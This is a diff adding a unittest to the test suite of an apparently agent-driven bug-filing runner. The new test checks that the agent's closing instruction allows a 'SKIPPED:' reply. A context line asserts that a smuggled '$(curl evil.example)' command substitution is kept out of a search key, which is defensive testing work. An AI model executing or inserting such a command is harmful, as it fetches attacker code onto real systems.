@@ -1633,6 +1633,21 @@ class SearchKeyInFilingBriefTests(unittest.TestCase):
         self.assertIn("`foo.py`", key_block)
         self.assertNotIn("$(curl evil.example)", key_block)
 
+    def test_the_closing_instruction_offers_a_way_to_decline(self):
+        """A turn that declines has to be able to say so in the last line.
+
+        Live run `kube-agents-selfimprove-29795340` found an open pull request
+        for its finding, correctly declined to open a duplicate, and said so in
+        prose. The runner reads only the last line, matched neither a URL nor a
+        `SKIPPED:` marker, and recorded UNCONFIRMED -- spending one of the three
+        daily filing slots and a 24-hour cooldown on a run that opened nothing.
+        The closing instruction named the URL and no alternative, so a declining
+        turn was being asked for a format that did not exist.
+        """
+        tail = self._file("selfimprove_run.py:1").rstrip().rsplit("\n\n", 1)[-1]
+        self.assertIn("SKIPPED:", tail)
+        self.assertIn("URL", tail)
+
     def test_hostile_prose_with_no_file_is_refused_outright(self):
         # And the second defence: nothing here looks like a file, so
         # `location_key` falls back to the whole normalised string and
